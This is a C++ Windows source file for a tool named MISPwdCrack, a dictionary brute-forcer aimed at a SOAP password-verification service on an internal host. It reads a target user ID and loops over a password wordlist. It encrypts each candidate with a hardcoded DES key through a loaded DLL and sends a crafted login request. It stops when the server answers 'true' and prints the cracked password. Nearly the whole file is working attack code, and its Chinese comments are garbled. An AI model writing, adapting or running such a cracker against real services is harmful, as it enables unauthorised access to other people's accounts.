// MISPwdCrack.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "MISPwdCrack.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// The one and only application object
#include <WinSock2.h>

#pragma comment (lib, "ws2_32")
CWinApp theApp;

using namespace std;

// ��¼���ݰ����ݵĶ���
char szPacket[] = "POST /enjoyrmis_ws/ws/passport/cwspassportforpb.asmx?wsdl HTTP/1.1\r\n" \
                  "Host: 192.168.0.252:8001\r\n" \
                  "Connection: Keep-Alive\r\n" \
                  "User-Agent: EasySoap++/0.6\r\n" \
                  "Content-Type: text/xml; charset=\"UTF-8\"\r\n" \
                  "SOAPAction: \"http://tempuri.org/VerifyPsword\"\r\n" \
                  "Content-Length: %d" \
                  "\r\n\r\n" \
                  "<E:Envelope\r\n" \
                  "	xmlns:E=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n" \
                  "	xmlns:A=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n" \
                  "	xmlns:s=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n" \
                  "	xmlns:y=\"http://www.w3.org/2001/XMLSchema\"\r\n" \
                  "	E:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n" \
                  "<E:Body>\r\n" \
                  "<m:VerifyPsword\r\n" \
                  "	xmlns:m=\"http://tempuri.org/\">\r\n" \
                  "<m:sName\r\n" \
                  "	s:type=\"y:string\">%s</m:sName>\r\n" \
                  "<m:sType\r\n" \
                  "	s:type=\"y:string\">%s</m:sType>\r\n" \
                  "<m:sOrgId\r\n" \
                  "	s:type=\"y:string\"></m:sOrgId>\r\n" \
                  "<m:sPassword\r\n" \
                  "	s:type=\"y:string\">%s</m:sPassword>\r\n" \
                  "</m:VerifyPsword>\r\n" \
                  "</E:Body>\r\n" \
                  "</E:Envelope>\r\n";

// �޷���ʾ�ַ��Ķ���
char szShellCode[] = "\xE6\x8D\xB7\xE8\xAF\x9A\xE9\x9B\xB6\xE5\x94\xAE\xE4\xB8\x9A\xE7\xB3" \
                     "\xBB\xE7\xBB\x9F";


int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
{
	int nRetCode = 0;

    // socket�Ľ������������������
    WSAData wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    sockaddr_in sockAddr;
    sockAddr.sin_addr.S_un.S_addr = inet_addr("192.168.0.252");
    sockAddr.sin_port = htons(8001);
    sockAddr.sin_family = PF_INET;
    
    int b = connect(s, (SOCKADDR *)&sockAddr, sizeof(sockAddr));

    // ����des64.dll�ļ�
    char szCurrentPath[MAX_PATH] = { 0 };
    HINSTANCE hMod = NULL;
    PROC des64Proc = NULL;
    GetCurrentDirectory(MAX_PATH, szCurrentPath);
    
    strcat(szCurrentPath, "\\des64.dll");
    
    hMod = LoadLibrary(szCurrentPath);
    des64Proc = GetProcAddress(hMod, "b64_des");

    // ��ȡ�ֵ��ļ�
    GetCurrentDirectory(MAX_PATH, szCurrentPath);
    strcat(szCurrentPath, "\\superdic.txt");

    FILE *pFile = fopen(szCurrentPath, "r");
    
    if ( pFile == NULL )
    {
        printf("fopen error. \r\n");
        return -1;
    }
    
    CString csPacket;                   // ����������
    char szPwd[MAXBYTE] = { 0 };        // �����ʺ�
    char szUser[MAXBYTE] = { 0 };       // ��������

    printf("��������Ҫ�ƽ�Ĺ���:");
    scanf("%s", szUser);

    printf("�����ƽ����Ժ�... \r\n");

    DWORD dwStart = GetTickCount();

    int i = 1;

    while ( !feof(pFile) )
    {
        // ��ȡ�ֵ��е�����
        fgets(szPwd, 7, pFile);
        szPwd[6] = NULL;

        int nPassLen = strlen(szPwd);
        char *szKey = "SZTHZWG";
        char szBuf[MAXBYTE] = { 0 };
        char *pszBuf = szBuf;
        char szBufPass[MAXBYTE] = { 0 };
        char *pszBufPass = szBufPass;
        char *pszPassnew = szPwd;

        // ��������м���
        __asm
        {
            push 1
            push nPassLen       // ����ǰ�ַ�������
            push szKey          // ��Կ
            push pszBufPass     // ������ܺ���ַ���
            push pszPassnew     // ԭ�����ַ���
            call des64Proc
        }
        
        // �����ַ���
        csPacket.Format(szPacket, 583 + strlen(szUser) + strlen(pszBufPass), szUser, szShellCode, pszBufPass);
        
        // �����ƽ�
        char szRecvBuffer[1024] = { 0 };
        
        b = send(s, csPacket.GetBuffer(0), csPacket.GetLength(), 0);
        
        recv(s, szRecvBuffer, 1024, 0);
        
        CString strRecv;
        strRecv = szRecvBuffer;
        int bRet = strRecv.Find("true", 0);

        if ( bRet != -1 )
        {
            cout << endl;
            cout << "�ù��Ŷ�Ӧ����Ϊ:" << szPwd << endl;
            break;
        } 
    }
    DWORD dwEnd = GetTickCount();

    DWORD dwTimed = dwEnd - dwStart;

    printf("����ʱ��Ϊ: %d.%d��\r\n", dwTimed / 1000, dwTimed % 1000);

    if ( pFile != NULL )
    {
        fclose(pFile);
        pFile = NULL;
    }

    closesocket(s);

    WSACleanup();

    getchar();
    getchar();

	return nRetCode;
}


